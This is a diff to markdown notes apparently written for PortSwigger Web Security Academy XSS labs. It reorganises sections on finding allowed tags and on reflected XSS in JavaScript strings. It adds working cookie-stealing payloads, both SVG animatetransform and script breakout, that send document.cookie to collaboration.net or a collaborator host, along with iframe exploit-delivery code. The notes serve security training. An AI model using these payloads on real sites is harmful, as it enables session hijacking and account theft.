@@ -193,6 +193,34 @@ document.cookie = "TopSecret=UnsecureCookieSessionValue4TopSecret007";
 <img src=1 onerror=alert(1)>
 ```  
   
+### Methodology to identify allowed XSS Tags  
+
+>The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  
+
+[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
+  
+>Host **iframe** code on exploit server and deliver exploit link to victim.  
+
+```html
+<iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
+```  
+  
+>Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG markup allowed using above methodology. This payload steal my own session cookie as POC.  
+
+```
+https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
+```  
+
+>Place the above payload on exploit server and insert URL with search value into an **iframe** before delivering to victim in below code block.  
+
+```html
+<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E"></iframe>
+```  
+  
+![svg animatetransform XSS](images/svg-animatetransform-xss.png)  
+  
+[PortSwigger Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)  
+  
 ### XSS Tags & Events  
 
 >This section give guide to ***identify*** reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
@@ -242,35 +270,30 @@ document.cookie = "TopSecret=UnsecureCookieSessionValue4TopSecret007";
 
 [Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  
 
-### Methodology to identify allowed XSS Tags  
+### Reflected String XSS  
 
->The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  
+>Submiting search string and reviewing the source code of the search result page, JavaScript string variable is identified reflecting the search string.  
 
-[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
-  
->Host **iframe** code on exploit server and deliver exploit link to victim.  
+![JavaScript string with single quote and backslash escaped](images/javascript-string-reflection.png)  
+
+>Using a payload ```test'payload``` and observe that a single quote gets backslash-escaped, preventing breaking out of the string.  
+
+```JavaScript
+</script><script>alert(1)</script>
+```  
+
+>Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator. This can be place in exploit server with an **iframe**.  
 
 ```html
-<iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
-```  
-  
->Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG markup allowed using above methodology. This payload steal my own session cookie as POC.  
-
-```
-https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
+</script><script>document.location="https://collaboration.net/?cookie="+document.cookie</script>
 ```  
 
->Place the above payload on exploit server and insert URL with search value into an **iframe** before delivering to victim in below code block.  
+![collaborator get cookies](images/collaborator-get-cookies.png)  
 
-```html
-<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FCOLLABORATOR.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E"></iframe>
-```  
+[PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)  
   
-![svg animatetransform XSS](images/svg-animatetransform-xss.png)  
-  
-[PortSwigger Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)  
-  
-### Reflected XSS (Cookie Stealers)  
+
+### DOM Cookie Stealers  
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
